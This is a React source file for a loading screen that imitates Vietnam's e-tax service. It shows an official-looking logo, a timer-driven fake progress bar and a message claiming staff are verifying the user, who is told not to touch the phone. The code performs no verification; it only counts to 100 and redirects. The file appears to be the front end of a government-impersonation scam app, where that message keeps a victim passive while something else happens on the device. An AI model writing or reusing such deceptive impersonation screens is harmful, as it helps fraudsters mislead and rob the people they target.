import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import thueDientu from "@/assets/thuedinetu.png";

const LoadingPage = () => {
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    // Simulate loading progress
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          // Navigate to dashboard or success page after loading
          setTimeout(() => navigate("/dashboard"), 500);
          return 100;
        }
        return prev + 2;
      });
    }, 60);

    return () => clearInterval(interval);
  }, [navigate]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-red-600 to-red-700 flex flex-col items-center justify-center px-6 text-white">
      {/* Title */}
      <h1 className="text-2xl font-bold mb-12 tracking-wide">THUẾ ĐIỆN TỬ</h1>

      {/* Logo */}
      <div className="mb-12">
        <div className="w-48 h-48 rounded-full bg-yellow-400 border-8 border-yellow-300 flex items-center justify-center shadow-2xl">
          <div className="w-40 h-40 rounded-full bg-red-800 flex items-center justify-center">
            <img
              src={thueDientu}
              alt="Thuế Điện Tử"
              className="w-32 h-32 opacity-90"
            />
          </div>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="w-full max-w-sm mb-4">
        <div className="h-3 bg-white/30 rounded-full overflow-hidden">
          <div
            className="h-full bg-white transition-all duration-300 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>

      {/* Progress Text */}
      <p className="text-lg font-medium mb-2">{progress}%</p>

      {/* Loading Message */}
      <p className="text-center text-sm font-medium px-4">
        NHÂN VIÊN ĐANG XÁC THỰC VUI LÒNG KHÔNG
        <br />
        THAO TÁC TRÊN ĐIỆN THOẠI
      </p>
    </div>
  );
};

export default LoadingPage;
